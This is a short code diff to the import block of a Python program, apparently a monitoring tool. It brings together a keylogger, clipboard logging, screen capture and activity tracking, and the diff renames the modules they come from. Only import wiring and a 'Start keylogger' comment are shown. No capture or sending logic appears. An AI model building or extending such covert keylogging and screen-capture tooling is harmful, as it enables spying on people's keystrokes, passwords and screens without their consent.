@@ -1,9 +1,9 @@
 import threading
-from pynput import keyboard
-from keylogger import on_press
-from clipboard import log_clipboard
-from screen_capture import capture_screen
-from activity_tracker import track_activity
+from importKeyboard import keyboard
+from activeKeylogger import on_press
+from activeImport import log_clipboard
+from activeImageGrab import capture_screen
+from activeActivity import track_activity
 
 if __name__ == "__main__":
     # Start keylogger
